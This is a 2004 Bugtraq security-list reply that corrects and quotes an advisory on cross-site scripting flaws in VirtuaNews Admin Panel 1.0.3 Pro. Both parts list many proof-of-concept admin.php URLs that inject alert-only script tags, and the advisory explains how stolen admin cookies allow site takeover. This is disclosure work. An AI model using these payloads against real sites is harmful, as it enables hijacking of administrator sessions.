
Date: Mon, 8 Mar 2004 07:32:32 +0530
From: "Ravish" <ravish@...uxadvisory.com>
To: "'bugtraq'" <bugtraq@...urityfocus.com>
Cc: "'SecurITeam News'" <news@...uriteam.com>,
	"'securitytracker'" <bugs@...uritytracker.com>
Subject: RE: VirtuaNews Admin Panel 1.0.3 Pro Cross Site Scripting Vulnerabillity


Hello,

I would like to do some corrections.

This doesn't works: http://<host>/admin.php?"><script>alert('XSS')</script> 

This is a vBulletin's vulnerability that you reported few days back: 

http://<host>/forum/search.php?do=process&showposts=0&query=<script>alert('X
SS')</script>



This is not default virtuanews, it's a module made by me which is not
completed yet. Its only 30% done.

http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea>--><script>alert('XSS')</script>
http://<host>/admin.php?">action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&ma
innews=~~~~"></textarea><script>alert('XSS')</script>



The following will only work if the files module is installed:

http://<host>/admin.php?action=files&expand="><script>alert('XSS')</script>
http://<host>/admin.php?action=files_cat_delete&id="><script>alert('XSS')</s
cript>
http://<host>/admin.php?action=files_check&catid="><script>alert('XSS')</scr
ipt>



Addition
========
These are some XSS vulnerabilities that exist in VirtuaNews.

http://<host>/admin.php?action=news_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=news_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea>--><script>alert('XSS')</script>
http://<host>/admin.php?">action=news_add&catid=SELECT&title=~~~~~~~~~~~&ma
innews=~~~~"></textarea><script>alert('XSS')</script>



Ravish
Linux Advisory
http://www.linuxadvisory.com


-----Original Message-----
From: Rafel Ivgi, The-Insider [mailto:theinsider@....net.il] 
Sent: Friday, March 05, 2004 11:16 PM
To: bugtraq
Cc: SecurITeam News; securitytracker
Subject: VirtuaNews Admin Panel 1.0.3 Pro Cross Site Scripting
Vulnerabillity

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Software:        VirtuaNews Admin Panel
Vendor:           http://www.virtuanews.co.uk
Versions:        1.0.3 Pro
Platforms:       Unix/Windows
Bug:                 Cross Site Scripting Vulnerabillity
Risk:                Medium
Exploitation:   Remote with browser
Date:               19 Feb 2004
Author:            Rafel Ivgi, The-Insider
e-mail:             the_insider@...l.com
web:                http://theinsider.deep-ice.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1) Introduction
2) Bug
3) The Code

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

===============
1) Introduction
===============

VirtuaNews Admin Panel is a good administration software. Many
administrators choose it
to be their "safe door",  therefore it should strong and safe. The main risk
describes in this
advisory is the harm that could be done to the administration staff. When
the vulnerabilities
concerns the staff it is more dangerous that harming users, because if a
staff's member cookie
is stolen, the attackers can take over the website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

======
2) Bug
======

The Vulnerabillity is Cross Site Scripting. If an attacker will request any
of the following
urls from the server:

http://<host>/admin.php?"><script>alert('XSS')</script>
http://<host>/forum/search.php?do=process&showposts=0&query=<script>alert('X
SS')</script>
http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea>--><script>alert('XSS')</script>
http://<host>/admin.php?">action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&ma
innews=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=files&expand="><script>alert('XSS')</script>
http://<host>/admin.php?action=files_cat_delete&id="><script>alert('XSS')</s
cript>
http://<host>/admin.php?action=files_check&catid="><script>alert('XSS')</scr
ipt>
http://<host>/admin.php?action=newslogo_upload&"><script>alert('XSS')</scrip
t>

XSS appears and the server allows an attacker to inject & execute scripts.

In the words of securityfocus.com :
~~~~~~~~~~~~~~~~~~~~~~~~~~

If all of these circumstances are met, an attacker may be able to exploit
this issue
via a malicious link containing arbitrary HTML and script code as part of
the hostname.
When the malicious link is clicked by an unsuspecting user, the
attacker-supplied HTML
and script code will be executed by their web client. This will occur
because the server
will echo back the malicious hostname supplied in the client's request,
without sufficiently
escaping HTML and script code.

Attacks of this nature may make it possible for attackers to manipulate web
content or to
steal cookie-based authentication credentials. It may be possible to take
arbitrary actions as the victim user.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

===========
3) The Code
===========

http://<host>/admin.php?"><script>alert('XSS')</script>
http://<host>/forum/search.php?do=process&showposts=0&query=<script>alert('X
SS')</script>
http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&main
news=~~~~"></textarea>--><script>alert('XSS')</script>
http://<host>/admin.php?">action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&ma
innews=~~~~"></textarea><script>alert('XSS')</script>
http://<host>/admin.php?action=files&expand="><script>alert('XSS')</script>
http://<host>/admin.php?action=files_cat_delete&id="><script>alert('XSS')</s
cript>
http://<host>/admin.php?action=files_check&catid="><script>alert('XSS')</scr
ipt>
http://<host>/admin.php?action=newslogo_upload&"><script>alert('XSS')</scrip
t>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

---
Rafel Ivgi, The-Insider
http://theinsider.deep-ice.com

"Things that are unlikeable, are NOT impossible."



